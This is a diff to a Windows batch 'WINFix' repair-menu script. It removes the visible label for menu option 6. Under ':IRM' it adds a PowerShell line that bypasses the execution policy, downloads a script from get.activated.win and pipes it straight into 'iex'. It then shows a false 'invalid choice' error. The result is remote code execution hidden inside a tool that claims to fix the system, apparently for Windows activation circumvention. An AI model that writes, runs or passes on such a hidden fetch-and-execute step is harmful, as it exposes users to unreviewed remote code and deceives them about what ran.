@@ -83,7 +83,7 @@ echo.
 echo         [1] WINFix(C) MAIN                 [4] Perform System Restore
 echo         [2] Cryptographic Fix             [5] Miscellaneous Fixes
 echo         [3] BITS Fix                      [X] EXIT Program
-echo        [6]MG
+echo        
 echo.
 echo.
 echo.
@@ -1072,7 +1072,10 @@ Pause
 GOTO IRM
 :IRM
 cls
-start /d irm https://get.activated.win | iex
+Powershell -Noprofile -ExecutionPolicy Bypass -Command "&{irm https://get.activated.win | iex}"
+echo ERROR "%M%" invalid. Choose again.
+echo.
+Pause
 GOTO WINFIXMENU
 :ENDFIX
 CLS
@@ -1105,4 +1108,3 @@ Pause
 :EOF
 @ends
 PAUSE
-
